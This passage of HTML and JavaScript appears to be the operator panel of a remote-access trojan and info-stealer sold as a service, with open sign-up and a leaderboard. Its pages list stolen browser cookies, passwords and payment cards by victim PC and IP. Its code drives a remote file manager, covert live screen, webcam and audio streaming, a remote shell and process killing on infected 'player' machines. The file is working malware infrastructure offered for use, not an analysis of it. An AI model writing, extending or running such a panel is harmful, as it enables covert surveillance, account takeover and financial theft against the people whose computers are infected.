                            <div style="background: var(--bg-primary); padding: 12px; border-radius: 4px; font-family: monospace; font-size: 11px; color: #888; word-break: break-all; margin-bottom: 12px; max-height: 80px; overflow-y: auto;"
                                id="donutTokenDisplay">
                                No token loaded
                            </div>
                            <button class="btn btn-success" onclick="copyDonutToken()" style="width: 100%;">
                                <i class="fas fa-copy"></i> Copy Token
                            </button>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Browser Steals -->
            <div class="page" id="page-browser">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-globe" style="color: var(--accent);"></i> Browser
                        Steals</h1>
                    <button class="btn btn-primary" onclick="loadBrowserSteals()"><i class="fas fa-sync"></i>
                        Refresh</button>
                </div>

                <div class="stats-grid mb-6" id="browserStats">
                    <div class="stat-card glass-panel">
                        <div class="stat-value" id="browserTotalCookies">0</div>
                        <div class="stat-label">Total Cookies</div>
                    </div>
                    <div class="stat-card glass-panel">
                        <div class="stat-value" id="browserTotalPasswords">0</div>
                        <div class="stat-label">Total Passwords</div>
                    </div>
                    <div class="stat-card glass-panel">
                        <div class="stat-value" id="browserTotalPayments">0</div>
                        <div class="stat-label">Payment Cards</div>
                    </div>
                    <div class="stat-card glass-panel">
                        <div class="stat-value" id="browserTotalLogs">0</div>
                        <div class="stat-label">Total Logs</div>
                    </div>
                </div>

                <div class="glass-panel p-6">
                    <div style="overflow-x: auto;">
                        <table class="data-table" id="browserTable" style="width: 100%;">
                            <thead>
                                <tr>
                                    <th>PC Name</th>
                                    <th>Browser</th>
                                    <th>Cookies</th>
                                    <th>Passwords</th>
                                    <th>Autofills</th>
                                    <th>Payments</th>
                                    <th>IP</th>
                                    <th>Date</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                            <tbody id="browserTableBody">
                                <tr>
                                    <td colspan="9" style="text-align:center; padding: 40px; color: var(--text-muted);">
                                        Loading...</td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>

            <!-- File Manager -->
            <div class="page" id="page-files">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-folder-open" style="color: var(--accent);"></i>
                        Remote File
                        Manager</h1>
                    <div style="display: flex; gap: 8px;">
                        <select id="filesPlayerSelect" class="btn btn-secondary glass-btn" style="min-width: 200px;"
                            onchange="onFilePlayerSelected()">
                            <option value="">-- Select Player --</option>
                        </select>
                        <button class="btn btn-primary shadow-lg shadow-accent/20" onclick="browseToPath()">
                            <i class="fas fa-sync-alt"></i> Browse
                        </button>
                    </div>
                </div>

                <div class="glass-panel"
                    style="display: flex; gap: 8px; margin-bottom: 24px; align-items: center; padding: 16px;">
                    <span style="color: var(--text-muted); min-width: 40px; font-weight: 500;">Path:</span>
                    <div style="flex: 1; position: relative;">
                        <i class="fas fa-folder absolute left-3 top-3 text-muted"
                            style="font-size: 12px; pointer-events: none;"></i>
                        <input type="text" id="currentPath" value="C:\\"
                            style="width: 100%; padding: 10px 10px 10px 32px; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; color: var(--text-primary); font-family: monospace;"
                            onkeypress="if(event.key==='Enter') browseToPath()">
                    </div>
                    <button class="btn btn-secondary glass-btn" onclick="goUpDirectory()"
                        title="Go to parent directory">
                        <i class="fas fa-level-up-alt"></i>
                    </button>
                    <button class="btn btn-secondary glass-btn" onclick="goToHome()" title="Go to user home">
                        <i class="fas fa-home"></i>
                    </button>
                    <button class="btn btn-secondary glass-btn" onclick="goToDesktop()" title="Go to desktop">
                        <i class="fas fa-desktop"></i>
                    </button>
                </div>

                <!-- File Operations Bar -->
                <div class="glass-panel"
                    style="display: flex; gap: 12px; margin-bottom: 24px; padding: 16px; align-items: center;">
                    <button class="btn btn-sm btn-secondary glass-btn" onclick="createNewFolder()">
                        <i class="fas fa-folder-plus"></i> New Folder
                    </button>
                    <button class="btn btn-sm btn-secondary glass-btn" onclick="uploadFileDialog()">
                        <i class="fas fa-upload"></i> Upload File
                    </button>
                    <input type="file" id="fileUploadInput" style="display: none;" onchange="handleFileUpload(event)">
                    <span id="fileManagerStatus"
                        style="margin-left: auto; color: var(--text-muted); font-size: 13px; display: flex; align-items: center; gap: 8px;">
                        <i class="fas fa-info-circle"></i> Select a player to browse files
                    </span>
                </div>

                <div class="table-container glass-panel" style="max-height: 60vh; overflow-y: auto; padding: 0;">
                    <table style="border-collapse: separate; border-spacing: 0;">
                        <thead
                            style="position: sticky; top: 0; background: rgba(15, 15, 20, 0.95); z-index: 10; backdrop-filter: blur(8px);">
                            <tr>
                                <th style="width: 40px; border-bottom: 1px solid rgba(255,255,255,0.05);"></th>
                                <th style="border-bottom: 1px solid rgba(255,255,255,0.05);">Name</th>
                                <th style="width: 100px; border-bottom: 1px solid rgba(255,255,255,0.05);">Size
                                </th>
                                <th style="width: 160px; border-bottom: 1px solid rgba(255,255,255,0.05);">
                                    Modified</th>
                                <th style="width: 150px; border-bottom: 1px solid rgba(255,255,255,0.05);">
                                    Actions</th>
                            </tr>
                        </thead>
                        <tbody id="fileListTable">
                            <tr>
                                <td colspan="5" style="text-align: center; color: var(--text-muted); padding: 60px;">
                                    <i class="fas fa-folder-open"
                                        style="font-size: 64px; opacity: 0.2; margin-bottom: 16px; display: block;"></i>
                                    Select a player and click Browse to explore files
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>

                <div class="glass-panel" style="margin-top: 16px; padding: 16px; display: none;" id="filePreview">
                    <div
                        style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 12px;">
                        <h4 style="margin: 0; font-size: 16px;"><i class="fas fa-eye text-accent"></i> File
                            Preview:
                            <span id="previewFileName" style="color: var(--text-primary);"></span>
                        </h4>
                        <button class="btn btn-sm btn-ghost hover:text-white" onclick="closeFilePreview()">
                            <i class="fas fa-times"></i> Close
                        </button>
                    </div>
                    <pre id="filePreviewContent"
                        style="background: rgba(0,0,0,0.4); padding: 16px; border-radius: 8px; overflow-x: auto; max-height: 400px; overflow-y: auto; margin: 0; font-size: 12px; font-family: 'Consolas', monospace; color: #e0e0e0; border: 1px solid rgba(255,255,255,0.05);"></pre>
                </div>
            </div>
        </main>
    </div>

    <!-- Modal -->
    <div class="modal" id="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 id="modalTitle">Details</h3>
                <button class="modal-close" onclick="closeModal()">&times;</button>
            </div>
            <div class="modal-body" id="modalBody"></div>
        </div>
    </div>

    <!-- Screenshare Modal -->
    <!-- Screenshare Modal (Glassy) -->
    <div class="screenshare-modal glass-panel" id="screenshareModal"
        style="background: rgba(10, 10, 15, 0.85); border: 1px solid rgba(255,255,255,0.1);">
        <div class="screenshare-modal-header" style="border-bottom: 1px solid rgba(255,255,255,0.05);">
            <div class="screenshare-modal-title">
                <i class="fas fa-tv" style="color: var(--accent); filter: drop-shadow(0 0 5px var(--accent));"></i>
                <span style="font-weight: 600;">Live Screenshare</span>
                <span id="screenshareModalPlayer" style="color: var(--accent); opacity: 0.9;"></span>
            </div>
            <div class="screenshare-modal-header-controls">
                <div class="screenshare-modal-status stopped" id="screenshareModalStatus"
                    style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.05);">
                    <i class="fas fa-circle"></i>
                    <span>Not streaming</span>
                </div>
                <!-- Volume Control -->
                <div class="volume-control" style="background: rgba(0,0,0,0.2);">
                    <i class="fas fa-volume-up" id="screenshareMuteBtn" onclick="toggleScreenshareMute()"></i>
                    <input type="range" class="volume-slider" id="screenshareVolume" min="0" max="100" value="50"
                        oninput="setScreenshareVolume(this.value)">
                </div>
                <button class="btn btn-sm btn-ghost hover:text-white" onclick="closeScreenshareModal()">
                    <i class="fas fa-times"></i> Close
                </button>
            </div>
        </div>

        <!-- Video Body -->
        <div class="screenshare-modal-body" onclick="event.target === this && closeScreenshareModal()"
            style="display: flex; align-items: center; justify-content: center; background: rgba(0,0,0,0.5);">
            <div
                style="position: relative; max-width: 95%; max-height: 90%; box-shadow: 0 0 50px rgba(0,0,0,0.5); border-radius: 8px; overflow: hidden;">
                <img id="screenshareModalImage" class="screenshare-modal-image"
                    style="display: none; width: 100%; height: auto; display: block;" />
                <div id="screenshareModalPlaceholder"
                    style="color: var(--text-muted); text-align: center; padding: 40px;">
                    <i class="fas fa-desktop" style="font-size: 64px; margin-bottom: 20px; opacity: 0.3;"></i>
                    <p style="font-size: 16px;">Click Start to begin streaming</p>
                </div>
                <!-- FPS Overlay -->
                <div class="absolute top-2 left-2 bg-black/60 px-2 py-1 rounded text-xs text-white" id="screenshareFps"
                    style="backdrop-filter: blur(4px);">0 FPS</div>
            </div>
        </div>

        <!-- Controls Footer -->
        <div class="screenshare-modal-controls"
            style="background: rgba(0,0,0,0.4); border-top: 1px solid rgba(255,255,255,0.05); padding: 15px;">
            <!-- Quality Settings (Glass Pill) -->
            <div style="display: flex; gap: 15px; align-items: center; margin-right: auto;">
                <div class="flex items-center gap-2 bg-white/5 px-3 py-1 rounded-full border border-white/5">
                    <i class="fas fa-sliders-h text-xs text-muted"></i>
                    <select id="streamQualitySlider"
                        onchange="window.streamQuality = this.value; updateStreamQualityLabel()"
                        style="background: transparent; border: none; color: white; font-size: 12px; width: 60px;">
                        <option value="40">Low</option>
                        <option value="60">Med</option>
                        <option value="80" selected>High</option>
                    </select>
                </div>
                <div class="flex items-center gap-2 bg-white/5 px-3 py-1 rounded-full border border-white/5">
                    <i class="fas fa-tachometer-alt text-xs text-muted"></i>
                    <select id="streamFpsSlider" onchange="window.streamFps = this.value; updateStreamQualityLabel()"
                        style="background: transparent; border: none; color: white; font-size: 12px; width: 60px;">
                        <option value="15">15 FPS</option>
                        <option value="30" selected>30 FPS</option>
                        <option value="60">60 FPS</option>
                    </select>
                </div>
            </div>

            <!-- Actions -->
            <button class="btn btn-primary shadow-lg shadow-accent/20" onclick="startScreenshareModal()"
                id="screenshareStartBtn">
                <i class="fas fa-play"></i> Start
            </button>
            <button class="btn btn-danger hidden" onclick="stopScreenshareModal()" id="screenshareStopBtn">
                <i class="fas fa-stop"></i> Stop
            </button>
            <button class="btn btn-secondary glass-btn" onclick="toggleScreenshareSound()" id="screenshareSoundBtn">
                <i class="fas fa-volume-up"></i>
            </button>
            <button class="btn btn-secondary glass-btn" onclick="requestScreenshotModal()">
                <i class="fas fa-camera"></i>
            </button>
            <button class="btn btn-secondary glass-btn" onclick="toggleFullscreen()">
                <i class="fas fa-expand"></i>
            </button>
            <span id="screenshareStats"
                style="color: var(--text-muted); font-size: 11px; margin-left: 10px;">Ready</span>
        </div>
        <audio id="screenshareAudio" style="display: none;"></audio>
    </div>

    <!-- Webcam Modal (Glassy) -->
    <div class="screenshare-modal glass-panel" id="webcamModal"
        style="background: rgba(10, 10, 15, 0.85); border: 1px solid rgba(255,255,255,0.1);">
        <div class="screenshare-modal-header" style="border-bottom: 1px solid rgba(255,255,255,0.05);">
            <div class="screenshare-modal-title">
                <i class="fas fa-video" style="color: var(--warning); filter: drop-shadow(0 0 5px var(--warning));"></i>
                <span style="font-weight: 600;">Live Webcam</span>
                <span id="webcamModalPlayer" style="color: var(--warning); opacity: 0.9;"></span>
            </div>
            <div class="screenshare-modal-header-controls">
                <div class="screenshare-modal-status stopped" id="webcamModalStatus"
                    style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.05);">
                    <i class="fas fa-circle"></i>
                    <span>Not streaming</span>
                </div>
                <div class="volume-control" style="background: rgba(0,0,0,0.2);">
                    <i class="fas fa-volume-up" id="webcamMuteBtn" onclick="toggleWebcamMute()"></i>
                    <input type="range" class="volume-slider" id="webcamVolume" min="0" max="100" value="50"
                        oninput="setWebcamVolume(this.value)">
                </div>
                <button class="btn btn-sm btn-ghost hover:text-white" onclick="closeWebcamModal()">
                    <i class="fas fa-times"></i> Close
                </button>
            </div>
        </div>
        <div class="screenshare-modal-body" onclick="event.target === this && closeWebcamModal()"
            style="display: flex; align-items: center; justify-content: center; background: rgba(0,0,0,0.5);">
            <div
                style="position: relative; max-width: 95%; max-height: 90%; box-shadow: 0 0 50px rgba(0,0,0,0.5); border-radius: 8px; overflow: hidden;">
                <img id="webcamModalImage" class="screenshare-modal-image"
                    style="display: none; width: 100%; height: auto; display: block;" />
                <div id="webcamModalPlaceholder" style="color: var(--text-muted); text-align: center; padding: 40px;">
                    <i class="fas fa-video" style="font-size: 64px; margin-bottom: 20px; opacity: 0.3;"></i>
                    <p style="font-size: 16px;">Click Start to begin webcam stream</p>
                </div>
                <!-- FPS Overlay -->
                <div class="absolute top-2 left-2 bg-black/60 px-2 py-1 rounded text-xs text-white" id="webcamFps"
                    style="backdrop-filter: blur(4px);">0 FPS</div>
            </div>
        </div>
        <!-- Controls Footer -->
        <div class="screenshare-modal-controls"
            style="background: rgba(0,0,0,0.4); border-top: 1px solid rgba(255,255,255,0.05); padding: 15px;">
            <!-- Quality Settings (Glass Pill) -->
            <div style="display: flex; gap: 15px; align-items: center; margin-right: auto;">
                <div class="flex items-center gap-2 bg-white/5 px-3 py-1 rounded-full border border-white/5">
                    <i class="fas fa-sliders-h text-xs text-muted"></i>
                    <select id="webcamQualitySlider"
                        onchange="window.webcamQuality = this.value; updateWebcamQualityLabel()"
                        style="background: transparent; border: none; color: white; font-size: 12px; width: 60px;">
                        <option value="40">Low</option>
                        <option value="60">Med</option>
                        <option value="80" selected>High</option>
                    </select>
                </div>
                <div class="flex items-center gap-2 bg-white/5 px-3 py-1 rounded-full border border-white/5">
                    <i class="fas fa-tachometer-alt text-xs text-muted"></i>
                    <select id="webcamFpsSlider" onchange="window.webcamFps = this.value; updateStreamQualityLabel()"
                        style="background: transparent; border: none; color: white; font-size: 12px; width: 60px;">
                        <option value="15">15 FPS</option>
                        <option value="30" selected>30 FPS</option>
                    </select>
                </div>
            </div>

            <button class="btn btn-primary shadow-lg shadow-accent/20" onclick="startWebcamModal()" id="webcamStartBtn">
                <i class="fas fa-play"></i> Start
            </button>
            <button class="btn btn-danger hidden" onclick="stopWebcamModal()" id="webcamStopBtn">
                <i class="fas fa-stop"></i> Stop
            </button>
            <button class="btn btn-secondary glass-btn" onclick="toggleWebcamMute()" id="webcamSoundBtn">
                <i class="fas fa-volume-up"></i>
            </button>
            <button class="btn btn-secondary glass-btn" onclick="requestWebcamSnapshot()">
                <i class="fas fa-camera"></i>
            </button>
            <button class="btn btn-secondary glass-btn" onclick="toggleWebcamFullscreen()">
                <i class="fas fa-expand"></i>
            </button>
            <span id="webcamStats" style="color: var(--text-muted); font-size: 11px; margin-left: 10px;">Ready</span>
        </div>
        <audio id="webcamAudio" style="display: none;"></audio>
    </div>

    <script>
        console.log("MAIN SCRIPT STARTING...");
        let currentUser = null;
        let allLogs = [];

        // Login function is defined in HEAD to ensure it loads early

        async function register() {
            if (!confirm('Generate a new FREE account?')) return;

            try {
                const res = await fetch(API + '/api/auth/register', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' }
                }).then(r => r.json());

                if (res.username) {
                    const msg = `Account Created Successfully!\n\nYOUR LOGIN ID: ${res.username}\n\nIMPORTANT: Save this ID now. It is your ONLY way to login.\n\n(Click OK to auto-fill the login form)`;
                    alert(msg);
                    document.getElementById('loginUsername').value = res.username;
                } else {
                    alert('Registration failed: ' + (res.detail || 'Unknown error'));
                }
            } catch (e) {
                alert('Error: ' + e.message);
            }
        }

        // ==================== WEBSOCKET LIVE STREAMING ====================
        let socket = null;
        let streamConnected = false;
        let currentStreamPlayer = null;
        let currentStreamType = null;
        let streamFpsCounter = 0;
        let streamFpsTimer = null;
        let lastFrameTime = 0;

        // OPTIMIZATION: Render loop variables
        let pendingScreenFrame = null;
        let isScreenRenderLoopRunning = false;
        let pendingWebcamFrame = null;
        let isWebcamRenderLoopRunning = false;
        let socketAuthenticated = false;

        function initSocket() {
            if (socket && socket.connected) return;

            // OPTIMIZATION: Force WebSocket transport to avoid polling overhead
            socket = io(window.location.origin, {
                transports: ['websocket'],
                reconnection: true,
                reconnectionAttempts: Infinity,
                reconnectionDelay: 1000,
                reconnectionDelayMax: 5000,
                randomizationFactor: 0.5,
                upgrade: false, // No upgrade needed if we force websocket
                timeout: 20000,
                autoConnect: true
            });

            socket.on('connect', () => {
                console.log('[WS] Connected to server (WebSocket)');
                streamConnected = true;
                updateStreamStatus('connected');

                // AUTHENTICATE with JWT token for user isolation
                if (token) {
                    socket.emit('authenticate', { token: token });
                }
            });

            socket.on('authenticated', (data) => {
                console.log('[WS] Authenticated:', data);
                socketAuthenticated = true;
                // Re-join current stream if needed
                if (currentStreamPlayer) {
                    joinStream(currentStreamPlayer, currentStreamType);
                }

                // Request cached previews
                socket.emit('request_previews');
            });

            socket.on('auth_error', (data) => {
                console.error('[WS] Auth error:', data);
                toast('Socket authentication failed', 'error');
            });

            socket.on('stream_error', (data) => {
                const errMsg = data.error || (typeof data === 'string' ? data : JSON.stringify(data));
                console.warn('[WS] Stream error:', errMsg);
                // toast('Stream access denied: ' + errMsg, 'error'); // Suppress toast spam
            });

            socket.on('disconnect', () => {
                console.log('[WS] Disconnected from server');
                streamConnected = false;
                socketAuthenticated = false;
                updateStreamStatus('disconnected');
            });

            socket.on('stream_joined', (data) => {
                console.log('[WS] Joined stream:', data);
                const t = (data && data.type) ? data.type : 'stream';
                const p = (data && data.player) ? data.player : currentStreamPlayer || 'unknown';
                toast(`Connected to ${t} for ${p}`);
            });

            socket.on('stream_starting', (data) => {
                console.log('[WS] Stream starting:', data);
                toast(`Stream starting for ${data.player}`, 'info');
            });

            socket.on('guardian_offline', (data) => {
                console.log('[WS] Guardian went offline:', data);
                if (currentStreamPlayer === data.player) {
                    toast(`${data.player} went offline`, 'warning');
                }
            });

            // Preview screenshots for stream thumbnails
            socket.on('preview_update', (data) => {
                console.log('[WS] Preview update:', data.player);
                // Store preview for this player
                if (!window.playerPreviews) window.playerPreviews = {};
                window.playerPreviews[data.player] = data.image;

                // Update any visible thumbnail for this player
                const thumbnails = document.querySelectorAll(`[data-player-preview="${data.player}"]`);
                thumbnails.forEach(img => {
                    img.src = 'data:image/jpeg;base64,' + data.image;
                });
            });

            socket.on('frame', (data) => {
                // Received a frame from WebSocket stream
                console.log('[WS] Frame received:', data.type, 'size:', data.frame?.length || 0);

                const now = Date.now();
                const frameTime = now - lastFrameTime;
                lastFrameTime = now;
                streamFpsCounter++;

                if (data.type === 'screen') {
                    updateScreenshareFrame(data.frame);
                    screenshareFpsCounter++; // Count ACTUAL WebSocket frames
                } else if (data.type === 'webcam') {
                    updateWebcamFrame(data.frame);
                }
            });

            socket.on('audio', (data) => {
                // Received audio data
                playStreamAudio(data.audio);
            });

            socket.on('error', (error) => {
                console.error('[WS] Error:', error);
                toast('Stream error: ' + error, 'error');
            });

            // Ghost Chat Events
            socket.on('chat_message', (data) => {
                const target = document.getElementById('chatTargetSelect').value;
                if (data.player === target) {
                    addChatMessage(data.player, data.message, 'in');
                } else {
                    toast(`${data.player}: ${data.message}`, 'info');
                }
            });

            socket.on('command_response', (data) => {
                console.log('[WS] Command response:', data);

                // Try to parse as JSON first (for File/Process Manager)
                try {
                    let jsonData = null;
                    if (typeof data.result === 'string' && (data.result.startsWith('{') || data.result.startsWith('['))) {
                        jsonData = JSON.parse(data.result);
                    } else if (typeof data.result === 'object') {
                        jsonData = data.result;
                    }

                    if (jsonData) {
                        // 1. File Manager Response
                        if (jsonData.files && Array.isArray(jsonData.files)) {
                            const tbody = document.getElementById('fileListTable');
                            const pathInput = document.getElementById('currentPath');
                            if (tbody && pathInput) {
                                pathInput.value = jsonData.path || pathInput.value;
                                tbody.innerHTML = ''; // Clear loading spinner

                                if (jsonData.files.length === 0) {
                                    tbody.innerHTML = '<tr><td colspan="5" style="text-align:center; padding: 20px; color: var(--text-muted);">Empty directory</td></tr>';
                                } else {
                                    jsonData.files.forEach(f => {
                                        const icon = f.type === 'dir' ? '<i class="fas fa-folder text-yellow-500"></i>' : '<i class="fas fa-file text-blue-400"></i>';
                                        const date = f.date || '-';
                                        const size = f.type === 'dir' ? '-' : formatBytes(f.size);
                                        const onclick = f.type === 'dir' ? `onclick="browseToPath('${jsonData.path.replace(/\\/g, '\\\\')}\\\\${f.name}')"` : '';
                                        const cursor = f.type === 'dir' ? 'cursor: pointer;' : '';

                                        const row = `
                                            <tr style="${cursor}" ${onclick}>
                                                <td style="text-align: center;">${icon}</td>
                                                <td>${f.name}</td>
                                                <td>${size}</td>
                                                <td>${date}</td>
                                                <td>
                                                    <button class="btn-icon" onclick="downloadRemoteFile('${jsonData.path.replace(/\\/g, '\\\\')}\\\\${f.name}')" title="Download">
                                                        <i class="fas fa-download"></i>
                                                    </button>
                                                </td>
                                            </tr>
                                        `;
                                        tbody.insertAdjacentHTML('beforeend', row);
                                    });
                                }
                                return; // Handled as file list, don't print to term
                            }
                        }

                        // 2. Process Manager Response (Array of processes)
                        if (Array.isArray(jsonData) && jsonData.length > 0 && jsonData[0].pid !== undefined) {
                            const tbody = document.getElementById('processListTable');
                            if (tbody) {
                                tbody.innerHTML = '';
                                jsonData.forEach(p => {
                                    const row = `
                                        <tr>
                                            <td>${p.pid}</td>
                                            <td>${p.name}</td>
                                            <td>
                                                <button class="btn btn-sm btn-danger" onclick="killProcess(${p.pid})" title="Kill Process">
                                                    <i class="fas fa-skull"></i>
                                                </button>
                                            </td>
                                        </tr>
                                    `;
                                    tbody.insertAdjacentHTML('beforeend', row);
                                });
                                return; // Handled as process list
                            }
                        }
                    }
                } catch (e) {
                    console.log('Not JSON response:', e);
                }

                // Fallback: Display shell output in xterm.js terminal
                const result = data.result || data.output || 'No output';
                if (window.term) { // Use window.term to access global scope
                    const lines = result.split('\n');
                    lines.forEach(line => {
                        window.term.writeln('\x1b[37m' + line + '\x1b[0m');
                    });
                    window.term.write('\r\n\x1b[32m$ \x1b[0m'); // Prompt
                }
            });
        }

        function updateStreamStatus(status) {
            const indicator = document.getElementById('streamConnectionStatus');
            if (indicator) {
                if (status === 'connected') {
                    indicator.innerHTML = '<i class="fas fa-circle" style="color: #22c55e;"></i> Live';
                } else {
                    indicator.innerHTML = '<i class="fas fa-circle" style="color: #ef4444;"></i> Offline';
                }
            }
        }

        function joinStream(player, type) {
            try {
                if (!socket || !socket.connected) {
                    initSocket();
                    setTimeout(() => joinStream(player, type), 500);
                    return;
                }

                // Wait for authentication before joining
                if (!socketAuthenticated) {
                    setTimeout(() => joinStream(player, type), 300);
                    return;
                }

                currentStreamPlayer = player;
                currentStreamType = type;

                socket.emit('join_stream', { player, type });

                // Start FPS counter only for screenshare (webcam uses modal counter)
                if (type === 'screen') {
                    streamFpsCounter = 0;
                    if (streamFpsTimer) clearInterval(streamFpsTimer);
                    streamFpsTimer = setInterval(() => {
                        const fpsDisplay = document.getElementById('screenshareFps');
                        if (fpsDisplay) {
                            fpsDisplay.textContent = streamFpsCounter + ' FPS';
                        }
                        streamFpsCounter = 0;
                    }, 1000);
                }
            } catch (e) {
                console.error('joinStream error:', e);
            }
        }

        function leaveStream(player, type) {
            try {
                if (socket && socket.connected) {
                    socket.emit('leave_stream', { player, type });
                }

                currentStreamPlayer = null;
                currentStreamType = null;

                if (streamFpsTimer) {
                    clearInterval(streamFpsTimer);
                    streamFpsTimer = null;
                }
            } catch (e) {
                console.error('leaveStream error:', e);
            }
        }

        function updateStreamQualityLabel() {
            const quality = parseInt(document.getElementById('streamQualitySlider')?.value || '80');
            const label = quality >= 85 ? 'Very High' : quality >= 70 ? 'High' : quality >= 50 ? 'Medium' : quality >= 30 ? 'Low' : 'Very Low';
            const qualityLabel = document.getElementById('qualityLabel');
            if (qualityLabel) {
                qualityLabel.textContent = quality + ' (' + label + ')';
            }
            window.streamQuality = quality;
        }

        function updateWebcamQualityLabel() {
            const quality = parseInt(document.getElementById('webcamQualitySlider')?.value || '80');
            const label = quality >= 85 ? 'Very High' : quality >= 70 ? 'High' : quality >= 50 ? 'Medium' : quality >= 30 ? 'Low' : 'Very Low';
            const qualityLabel = document.getElementById('webcamQualityLabel');
            if (qualityLabel) {
                qualityLabel.textContent = quality + ' (' + label + ')';
            }
            window.webcamQuality = quality;
        }

        function requestStartStream(player, type, quality = 80, fps = 30) {
            try {
                if (!socket || !socket.connected) {
                    initSocket();
                    setTimeout(() => requestStartStream(player, type, quality, fps), 500);
                    return;
                }

                // Store quality and fps settings
                window.streamQuality = quality || 80;
                window.streamFps = fps || 30;

                // Also send command via HTTP for Guardian compatibility
                api('/api/remote/command', 'POST', {
                    target_player: player,
                    command_type: type === 'screen' ? 'screenshot' : 'webcam',
                    command_data: 'continuous'
                }).catch(e => console.error('HTTP command error:', e));

                // Send with quality and fps for TCP optimization
                socket.emit('start_stream', {
                    player,
                    type,
                    quality: window.streamQuality,
                    fps: window.streamFps,
                    tcp_optimized: true
                });
            } catch (e) {
                console.error('requestStartStream error:', e);
            }
        }

        function requestStopStream(player, type) {
            if (socket && socket.connected) {
                socket.emit('stop_stream', { player, type });
            }

            // Also send stop command via HTTP
            api('/api/remote/command', 'POST', {
                target_player: player,
                command_type: type === 'screen' ? 'screenshot' : 'webcam',
                command_data: 'stop'
            });
        }

        function updateScreenshareFrame(frameBase64) {
            if (!frameBase64) return; // Ignore empty frames

            pendingScreenFrame = frameBase64;
            if (!isScreenRenderLoopRunning) {
                isScreenRenderLoopRunning = true;
                requestAnimationFrame(renderScreenLoop);
            }
        }

        function updateWebcamFrame(frameBase64) {
            pendingWebcamFrame = frameBase64;
            if (!isWebcamRenderLoopRunning) {
                isWebcamRenderLoopRunning = true;
                requestAnimationFrame(renderWebcamLoop);
            }
        }

        function renderScreenLoop() {
            if (pendingScreenFrame) {
                const frameBase64 = pendingScreenFrame;
                pendingScreenFrame = null;

                // Update modal image
                const img = document.getElementById('screenshareModalImage');
                if (img && img.style.display !== 'none') {
                    img.src = 'data:image/jpeg;base64,' + frameBase64;
                    const placeholder = document.getElementById('screenshareModalPlaceholder');
                    if (placeholder) placeholder.style.display = 'none';
                }

                // Also update the main page image (if visible)
                const mainImg = document.getElementById('screenshareImage');
                if (mainImg && mainImg.parentElement && mainImg.offsetParent !== null) {
                    mainImg.src = 'data:image/jpeg;base64,' + frameBase64;
                    mainImg.style.display = 'block';
                }

                requestAnimationFrame(renderScreenLoop);
            } else {
                isScreenRenderLoopRunning = false;
            }
        }

        function renderWebcamLoop() {
            if (pendingWebcamFrame) {
                const frameBase64 = pendingWebcamFrame;
                pendingWebcamFrame = null;

                const img = document.getElementById('webcamModalImage');
                const placeholder = document.getElementById('webcamModalPlaceholder');
                if (img) {
                    img.src = 'data:image/jpeg;base64,' + frameBase64;
                    img.style.display = 'block';
                    if (placeholder) placeholder.style.display = 'none';
                    try { webcamFpsCounter++; } catch (e) { }
                }

                requestAnimationFrame(renderWebcamLoop);
            } else {
                isWebcamRenderLoopRunning = false;
            }
        }

        let audioQueue = [];
        let isPlayingAudio = false;

        function playStreamAudio(audioBase64) {
            audioQueue.push(audioBase64);
            if (!isPlayingAudio) {
                playNextAudio();
            }
        }

        function playNextAudio() {
            if (audioQueue.length === 0) {
                isPlayingAudio = false;
                return;
            }

            isPlayingAudio = true;
            const audioData = audioQueue.shift();

            try {
                const audio = new Audio('data:audio/mp3;base64,' + audioData);
                audio.volume = 0.5;
                audio.onended = playNextAudio;
                audio.onerror = playNextAudio;
                audio.play().catch(e => {
                    console.log('Audio play error:', e);
                    playNextAudio();
                });
            } catch (e) {
                playNextAudio();
            }
        }

        async function api(endpoint, method = 'GET', body = null) {
            const opts = {
                method,
                headers: { 'Content-Type': 'application/json' }
            };
            if (token) opts.headers['Authorization'] = `Bearer ${token}`;
            if (body) opts.body = JSON.stringify(body);

            try {
                const res = await fetch(API + endpoint, opts);
                const data = await res.json();

                if (!res.ok) {
                    return { success: false, error: data.detail || data.error || 'Request failed' };
                }

                // Check if auth failed
                if (res.status === 401) {
                    logout();
                    toast('Authentication failed. Please login again.', 'error');
                    return { success: false, error: 'Unauthorized' };
                }

                return data;
            } catch (e) {
                console.error("API Network Error:", e);
                return { success: false, error: 'Network error: ' + e.message };
            }
        }

        function toast(msg, type = 'success') {
            const t = document.createElement('div');
            t.className = `toast ${type}`;
            t.textContent = msg;
            document.body.appendChild(t);
            setTimeout(() => t.remove(), 3000);
        }

        // Auth - logout
        async function updatePassword() {
            const password = document.getElementById('newPasswordInput').value;
            if (!password || password.length < 4) return alert('Password must be at least 4 characters');

            try {
                const res = await api('/api/settings/security/password', 'POST', { password });
                if (res.success) {
                    alert('Password updated successfully');
                    document.getElementById('newPasswordInput').value = '';
                } else {
                    alert('Error: ' + (res.error || 'Unknown error'));
                }
            } catch (e) { alert('Error: ' + e.message); }
        }

        async function updateLeaderboardName() {
            const name = document.getElementById('leaderboardNameInput').value;
            if (!name) return alert('Please enter a name');

            try {
                const res = await api('/api/settings/leaderboard/name', 'POST', { name });
                if (res.success) {
                    alert('Name updated successfully');
                } else {
                    alert('Error: ' + (res.error || 'Unknown error'));
                }
            } catch (e) { alert('Error: ' + e.message); }
        }

        async function loadLeaderboard() {
            const tbody = document.getElementById('leaderboardTable');
            if (!tbody) return;

            try {
                const res = await api('/api/dashboard/leaderboard');
                if (res.success && res.leaderboard) {
                    if (res.leaderboard.length === 0) {
                        tbody.innerHTML = '<tr><td colspan="3" style="padding: 20px; text-align: center; color: var(--text-muted);">No data yet</td></tr>';
                        return;
                    }

                    tbody.innerHTML = res.leaderboard.map(u => `
                        <tr style="border-bottom: 1px solid rgba(255,255,255,0.05);">
                            <td style="padding: 12px 20px;">
                                ${u.rank === 1 ? '<i class="fas fa-trophy" style="color: gold;"></i>' :
                            u.rank === 2 ? '<i class="fas fa-trophy" style="color: silver;"></i>' :
